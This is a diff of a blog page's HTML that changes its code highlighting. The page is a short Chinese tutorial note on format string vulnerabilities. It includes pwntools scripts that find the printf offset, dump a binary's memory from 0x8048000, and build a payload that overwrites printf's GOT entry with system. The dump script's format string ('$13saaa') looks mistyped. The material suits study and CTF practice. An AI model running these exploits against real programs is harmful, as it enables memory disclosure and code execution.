@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -496,15 +497,66 @@
 <blockquote>
 <p>格式化字符串漏洞是怎么产生的？首先要有一个函数，比如read, 比如gets获取用户输入的数据储存到局部变量中，然后直接把该变量作为printf这类函数的第一个参数值</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">	p = process(<span class="string">"a.out"</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	info = p.recv()</div><div class="line">	p.close()</div><div class="line">	<span class="keyword">return</span> info</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line"><span class="keyword">print</span> autofmt.offset</div></pre></td></tr></table></figure>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+
+<span class="token keyword">def</span> <span class="token function">exec_fmt</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"a.out"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    info <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> info
+
+autofmt <span class="token operator">=</span> FmtStr<span class="token punctuation">(</span>exec_fmt<span class="token punctuation">)</span>
+<span class="token keyword">print</span> autofmt<span class="token punctuation">.</span>offset
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里的FmtStr是pwn自带的，可以用它算出offset</p>
 <blockquote>
 <p>在Linux下，不开PIE保护时，32位的ELF的默认首地址为0x8048000，如果开启了PIE保护，则需要根据ELF的魔术头7f 45 4c 46进行爆破，内存地址一页一页的往前翻直到翻到ELF的魔术头为止</p>
 </blockquote>
 <p>另外要注意<code>\x00</code>的终止(截断)问题</p>
 <p>利用<br>形如<code>%12$s</code> =&gt; 会显示第十二个参数所指的地址处的值 即为<code>Value(addr(arg[11]))</code><br>形如<code>%12$x</code> =&gt; 会显示第十二个参数的十六进制值 即为<code>Value(arg[11])</code><br>不知道理解对不对<br>所以在找offset的时候应该使用<code>%12$x</code> 比如<code>ABCD%11$x</code>看看能不能得到<code>ABCD44434241</code><br>而在找到offset后，要dump原始的bin的时候要使用<code>%12$s</code>比如<code>&quot;%13$saaa&quot; + p32(0x8048000)</code></p>
-<p>dump 数据(读内存)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">f = open(<span class="string">'source.bin'</span>, <span class="string">'ab+'</span>)</div><div class="line"></div><div class="line">begin = <span class="number">0x8048000</span></div><div class="line">offset = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    addr = begin + offset</div><div class="line">    p = process(<span class="string">'./xxxx'</span>)</div><div class="line">    p.sendline(<span class="string">'$13saaa'</span> + p32(addr))</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        info = p.recvuntil(<span class="string">'aaa'</span>)[:<span class="number">-3</span>]</div><div class="line">    <span class="keyword">except</span> EOFError:</div><div class="line">        <span class="keyword">print</span> offset</div><div class="line">        <span class="keyword">break</span></div><div class="line">    info += <span class="string">'\x00'</span></div><div class="line">    p.close()</div><div class="line">    offset += len(info)</div><div class="line">    f.write(info)</div><div class="line">    f.flush()</div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
-<p>向<code>printf_got</code>里写入<code>system_addr</code>以达到<code>hack got</code>的目的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">printf_got = <span class="number">0x804a010</span></div><div class="line">system_add = <span class="number">0xaaaaaaaa</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">	p.sendline(payload)</div><div class="line">	<span class="keyword">return</span> p.recv()</div><div class="line"></div><div class="line">p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">payload = fmtstr_payload(autofmt.offset, &#123;printf_got: system_add&#125;)</div></pre></td></tr></table></figure></p>
+<p>dump 数据(读内存)</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'source.bin'</span><span class="token punctuation">,</span> <span class="token string">'ab+'</span><span class="token punctuation">)</span>
+
+begin <span class="token operator">=</span> <span class="token number">0x8048000</span>
+offset <span class="token operator">=</span> <span class="token number">0</span>
+
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    addr <span class="token operator">=</span> begin <span class="token operator">+</span> offset
+    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./xxxx'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'$13saaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        info <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaa'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
+    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> offset
+        <span class="token keyword">break</span>
+    info <span class="token operator">+=</span> <span class="token string">'\x00'</span>
+    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    offset <span class="token operator">+=</span> len<span class="token punctuation">(</span>info<span class="token punctuation">)</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>
+    f<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>向<code>printf_got</code>里写入<code>system_addr</code>以达到<code>hack got</code>的目的</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+printf_got <span class="token operator">=</span> <span class="token number">0x804a010</span>
+system_add <span class="token operator">=</span> <span class="token number">0xaaaaaaaa</span>
+
+<span class="token keyword">def</span> <span class="token function">exec_fmt</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>
+autofmt <span class="token operator">=</span> FmtStr<span class="token punctuation">(</span>exec_fmt<span class="token punctuation">)</span>
+payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>autofmt<span class="token punctuation">.</span>offset<span class="token punctuation">,</span> <span class="token punctuation">{</span>printf_got<span class="token punctuation">:</span> system_add<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>先就这样子了</p>
 
         
